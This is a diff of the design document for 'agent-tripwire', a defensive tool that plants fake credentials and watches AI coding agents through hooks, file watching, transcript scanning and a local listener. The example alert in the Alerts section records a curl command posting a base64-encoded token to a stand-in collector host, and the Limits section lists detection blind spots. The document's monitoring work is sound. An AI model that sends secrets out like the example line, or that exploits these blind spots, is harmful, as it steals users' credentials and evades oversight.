@@ -85,7 +85,9 @@ TRIPWIRE + <id>      id = 8 characters of base32 (A–Z, 2–7)
 | `ssh` | `.ssh/id_ed25519`    | OpenSSH private-key block whose body embeds the marker        |
 
 Profiles choose a default set: `--profile home` plants `aws`, `npm`, `ssh`;
-`--profile project` plants `env`. `--kind` overrides either.
+`--profile project` (the default for `plant`) plants `env`. `--kind`
+overrides either. Two support files hold no tokens: `.aws/config` (only with
+`--listen`) and `.metadata_never_index` (only in a `sandbox`).
 
 Files are created with the permissions the real file would have (`0600` for
 keys and credentials).
@@ -118,7 +120,7 @@ keys and credentials).
 
 ## Detection
 
-Three independent channels feed one alert log.
+Four independent channels feed one alert log.
 
 ### 1. Agent hooks (`tripwire hook`)
 
@@ -130,13 +132,18 @@ names as Claude Code (`Read`, `Write`, `Edit`, `Bash`, …).
 
 | Event       | Check                                                              | Alert          |
 | ----------- | ------------------------------------------------------------------ | -------------- |
-| PreToolUse  | `Read`/`Edit`/`Write`/`Grep`/`Glob` path is a planted file         | `read-attempt` |
-| PreToolUse  | `Bash` command names a planted file                                | `read-attempt` |
+| PreToolUse  | `file_path`, `path` or `notebook_path` resolves to a planted file  | `read-attempt` |
+| PreToolUse  | `command` (a string, or an argv array as in Codex) names a planted file | `read-attempt` |
 | PreToolUse  | any string in `tool_input` contains a token (any encoding)         | `exfil`        |
 | PostToolUse | any string in `tool_response` contains a token                     | `read`         |
+| other       | any string in the event (for example a user prompt) contains a token | `mention`    |
 
-Unknown tool names (MCP tools, Codex-specific names) still get the generic
-string scan, so the hook does not depend on a fixed tool list.
+Checks key on input fields, not tool names, so `Read`, `Edit`, `Write`,
+`Grep`, Codex's `shell`, MCP tools and unknown tools are all covered. Paths
+are resolved against the event's `cwd`, and a command counts as naming a file
+when the absolute path, the `cwd`-relative path, or a `~/`, `$HOME/` or
+`${HOME}/` form appears as a whole shell word (so `.env.example` and
+`other/.env` do not match `.env`).
 
 The hook is **observe-only by default**: it logs and exits 0 so the agent
 carries on and the session records what it does next. `--block` turns a
@@ -167,25 +174,30 @@ Watches every registered planted file, without root or system extensions.
   unavailable. On a `noatime` mount it cannot see reads; v1 documents this
   rather than detecting the mount option.
 
-Limits, stated in alerts and the README:
+Limits (also listed in the README):
 
 - File events do not say **which process** read the file. On Linux the
   watcher makes a best-effort scan of `/proc/*/fd` at event time; on macOS
   there is no attribution in v1. Hooks provide attribution.
 - Indexers and backup tools (Spotlight, Time Machine, antivirus, IDE file
-  watchers) can read files. `tripwire sandbox` writes `.metadata_never_index`
-  and recommends a directory outside indexed and backed-up locations.
+  watchers) can read files. `tripwire sandbox` writes `.metadata_never_index`;
+  choosing a directory outside indexed and backed-up locations is up to the
+  user.
 - Detection resolution on macOS is the poll interval.
 
-`watch` can also tail transcript directories (`--transcripts DIR`) and apply
-the transcript scanner to lines as they are appended, for agents without
-hook support.
+`watch` reloads the registry when it changes, so plants made after it starts
+are watched too. It can also tail transcript directories (`--transcripts
+DIR`) and apply the transcript scanner to complete lines as they are
+appended, for agents without hook support. Content already in a transcript
+when `watch` starts is not re-reported, and new `.jsonl` files are picked up
+within ten polls.
 
 ### 3. Transcript scanning (`tripwire scan`)
 
 Scans session transcripts after the fact. Input is JSONL (Claude Code
 `~/.claude/projects/**/*.jsonl`, Codex `~/.codex/sessions/**/*.jsonl`) or any
-text file. Each JSON line is parsed and every string value is checked, with
+text file; a directory argument expands to the `.jsonl` files beneath it.
+Each JSON line is parsed and every string value is checked, with
 its JSON path, so a hit is classified by where it occurred:
 
 | Location                                            | Classification |
@@ -219,8 +231,10 @@ token in its request line, headers or body. When `plant --listen PORT` is
 given, planted configs point at it: `.aws/config` gets `endpoint_url`,
 `.npmrc` gets a `registry=` on that port, and `.env` gets an `API_BASE_URL`.
 Running `aws s3 ls` or `npm publish` in the sandbox then sends the fake
-credential to the listener and raises a `use` alert. No third-party canary
-service is involved, and nothing is sent off the machine.
+credential to the listener and raises a `use` alert. The listener answers
+every request with `403`. No third-party canary service is involved, and
+nothing is sent off the machine. The npm path is verified end to end with
+`npm whoami`; the AWS path relies on the AWS CLI honouring `endpoint_url`.
 
 ## Alerts
 
@@ -228,16 +242,20 @@ Alerts are appended as JSON lines to `<state>/alerts.jsonl`:
 
 ```json
 {"time":"2026-11-12T10:15:03Z","kind":"exfil","source":"hook","token_id":"K7Q2MZXA",
- "plant_id":"p-3f9c","file":".aws/credentials","field":"aws_secret_access_key",
- "tool":"Bash","session":"…","detail":"curl -d … [tripwire:K7Q2MZXA] …"}
+ "plant_id":"p-iobcfl","file":"/Users/me/myapp/.env","field":"API_TOKEN",
+ "encoding":"base64","tool":"Bash","session":"…",
+ "detail":"curl -d [tripwire:K7Q2MZXA base64] https://collector.example"}
 ```
 
 The `detail` field is redacted: each planted value, including its random
 tail, is replaced with `[tripwire:<id>]`, and an encoded run holding one with
 `[tripwire:<id> <encoding>]`, so the log is safe to read and to re-scan while
-keeping the surrounding command or URL. Alerts are also
-printed to stderr, and `--notify` sends a desktop notification through
-`osascript` (macOS) or `notify-send` (Linux) when present.
+keeping the surrounding command or URL. If a token would still remain, the
+whole detail is replaced. Sources are `hook`, `watch`, `transcript` and
+`listen`; `scan` reports to stdout and does not write to the log. `hook`
+prints alerts to stderr, `watch` and `listen` print them to stdout, and
+`watch --notify` also sends a desktop notification through `osascript`
+(macOS) or `notify-send` (Linux) when present.
 
 Kinds, in decreasing severity: `exfil`, `use`, `read`, `read-attempt`,
 `modified`, `deleted`, `disclosed`, `mention`, `unregistered`.
@@ -247,8 +265,9 @@ Kinds, in decreasing severity: `exfil`, `use`, `read`, `read-attempt`,
 `$TRIPWIRE_STATE_DIR`, else `$XDG_STATE_HOME/agent-tripwire`, else
 `<real home>/.local/state/agent-tripwire`, resolved from the password database
 so that a hook running under a sandbox `HOME` finds the same state.
-Contents: `registry.json` (plants, files, hashes, token ids), `alerts.jsonl`.
-Writes go through a temporary file and rename.
+Contents: `registry.json` (plants, files, hashes, token ids), written through
+a temporary file and rename, and `alerts.jsonl`, appended one line per alert.
+The directory is created with mode `0700` and both files with `0600`.
 
 ## CLI (v1)
 
@@ -267,8 +286,9 @@ tripwire listen [--port PORT]              local use-detection listener (default
 tripwire alerts [--json] [--since TIME]    show the alert log
 ```
 
-Exit codes: `0` nothing found, `1` findings (`scan`), `2` error. `hook`
-always exits 0 unless `--block` denies a call.
+Exit codes: `0` success or nothing found, `1` findings (`scan`), `2` error.
+`hook` always exits 0 unless `--block` denies a call, which exits 2. `watch`
+and `listen` run until interrupted.
 
 ## Implementation notes
 
@@ -276,12 +296,14 @@ always exits 0 unless `--block` denies a call.
   the matcher, registry and hook logic directly; CLI tests use `assert_cmd`
   against a temporary state dir.
 - Runtime dependencies: `clap`, `serde`, `serde_json`, `anyhow`, `sha2`,
-  `base64`, `getrandom`, `libc` (password database, `utimensat`; bindings only, no
-  native build), and `inotify` on Linux only (bindings to a kernel API,
-  unprivileged). Nothing needs root or a kernel or system extension.
+  `base64`, `getrandom`, `libc` (password database and `O_NOFOLLOW`; bindings
+  only, no native build), and `inotify` on Linux only (bindings to a kernel
+  API, unprivileged). Access times are set through the standard library.
+  Nothing needs root or a kernel or system extension.
 - Dev dependencies: `tempfile`, `assert_cmd`, `predicates`.
-- CI (GitHub Actions, Linux and macOS): `cargo fmt --check`,
-  `cargo clippy --locked -- -D warnings`, `cargo test --locked`.
+- Minimum Rust version 1.88 (let-chains and `as_chunks`).
+- CI (GitHub Actions, Linux and macOS): `cargo fmt --all --check`,
+  `cargo clippy --locked --all-targets -- -D warnings`, `cargo test --locked`.
 
 ## Out of scope for v1
 
@@ -295,11 +317,12 @@ always exits 0 unless `--block` denies a call.
   provider's checksum.
 - Process attribution on macOS.
 
-## Build order
+## Status
 
-1. Token generation and matcher (ids, check characters, encodings).
-2. Registry, `plant`, `list`, `remove`, `sandbox` with the safety rules.
-3. `scan` and `hook`, including `hook config`.
-4. `watch` (atime arming, inotify on Linux, transcript tailing), `alerts`.
-5. `listen` and `--listen` configs.
-6. README with a demo walkthrough, LICENSE, CI.
+Everything in the CLI section is implemented and covered by tests that run
+on macOS and Linux. Verified by hand: `watch` read and modification
+detection on macOS, `listen` with a real `npm whoami` in a sandbox, and
+`remove` leaving a sandbox in place when the agent wrote its own files there.
+Not yet verified: a live Claude Code or Codex session with the hook installed
+(the tests use the documented event payloads), and the AWS CLI against the
+listener.
